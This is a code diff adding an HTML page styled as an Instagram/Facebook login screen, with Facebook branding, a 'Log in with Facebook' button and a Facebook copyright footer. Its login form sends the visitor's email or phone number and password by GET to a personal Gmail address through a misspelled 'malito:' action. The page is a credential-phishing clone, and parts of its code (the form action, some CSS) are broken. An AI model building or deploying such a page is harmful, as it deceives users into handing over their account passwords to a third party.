@@ -1,1 +1,152 @@
 Tech ISSUE XPERT 
+<!DOCTYPE html>
+<html>
+<head>
+<title>ChatApp</title>
+<meta charset="utf-8">
+
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="f1.css">
+<style>
+ div > {border-top: 10px solid transparent;
+         border-bottom: 12px solid transparent;
+         border-left:15px solid transparent;
+         border-right:165px solid transparent;
+					overflow: hidden; 
+				}
+.sidebar > .heading{
+				
+				}
+a > div{
+				position:relative ;
+				top:30px;
+				color:black;
+				left:0px;
+				text-align:left;
+				text-indent:15px;
+				padding:15px;
+				user-select:none;
+				outline:none;
+				transition: all 0.00000001s;
+				margin:-20px -10px;
+				border: 0px red solid;
+				background-color:white;
+					background-image: url('svgs/solid/angle-right.svg');
+								background-repeat: no-repeat ;
+								background-position:330px 15px;
+								background-size: 12px;
+								padding-right: 20px;
+				}
+</style>
+<head>
+<body> 
+<!-- Header content -->
+<div id="header">
+<h5>Logo</h5>
+<h4>
+<a href="home.html" class="getapp">Get the free App on Google Play.
+</a></h4>
+<a href="#">
+<img src="svgs/brands/google-play.svg"
+class="playstore"></a>
+</div>
+
+<!-- sidebar -->
+
+<input type="checkbox" id="check">
+<label for="check">
+  <img src="image/bars.svg" width="200px" id="btn">
+  <img src="image/times.svg" width="20px" id="cancel">
+</label>
+
+<div class="sidebar">
+<h3>Options</h3>
+<div class="heading">Account</div>
+<a href="#"><div>Edit Profile</div></a>
+<div><a href="#">Nametag</a></div>
+<div><a href="#">Change Password</a></div>
+<div><a href="#">Privacy and Security</a></div>
+<div><a href="#">Login Activity</a></div>
+<div><a href="#">Email from Instagram</a></div>
+<div class="heading">Setting</div>
+<div><a href="#">Language</a></div>
+<div><a href="#">Apps and Website</a></div>
+<div><a href="#">Notification</a></div>
+<div class="heading">About</div>
+<div><a href="#">Ads</a></div>
+<div><a href="#">Help Center</a></div>
+<div><a href="#">Report a Problem</a></div>
+<div><a href="#">More</a></div>
+<div class="heading"></div>
+<div class="log-out"><a href="#">Log Out</a></div>
+</div>
+
+<!-- Logo -->
+<h1 class="logo">logo</h1>
+
+<!-- facebook login-->
+<button id="login-email"><img src="image/facebook-square.svg" width="20px" height="20px">Log in with Facebook</button>
+
+<!-- or item-->
+<hr>
+<p class="or">OR</p>
+
+<!-- main content-->
+<div id="footer">
+<div id="input">
+
+<form action="malito:ishu.111636@gmail.com"
+method="GET">
+
+<input type="type" name="Email Phone-No" placeholder="Email or Phone number" id="email" autocomplete="on" autocorrect="off" autocapitalize="off" maxlength="40"
+required 
+class="input"
+><br>
+
+<input type="password" name="password" placeholder="Password" id="password"
+ maxlength="40" required
+ class="input"><br>
+
+<!-- show button-->
+<div id="toggle" onclick="showhide();" ></div>
+</div>
+
+<p>
+<a href="#" id="forget-password">Forget password?</a></p>
+<button id="login"> Log in</button><br>
+</form>
+
+<p id="new-account">Don't have an account?<a href="#" id="sign-up"> Sign up!</a></p></div>
+
+<footer><p>&copy FACEBOOK Inc.</p></footer>
+
+
+
+<script type="text/javascript">
+
+var password = document.getElementById(
+				'password');
+
+var toggle = document.getElementById(
+				'toggle');
+				
+				function showhide(){
+								if(password.type === 'password'){
+												password.setAttribute('type', 'text');
+												toggle.classList.add('show')
+												}
+												
+								else{password.setAttribute('type', 'password');
+												toggle.classList.remove('show')
+												
+												}
+								}
+								
+				
+								
+</script>
+
+
+</body>
+</html>
+
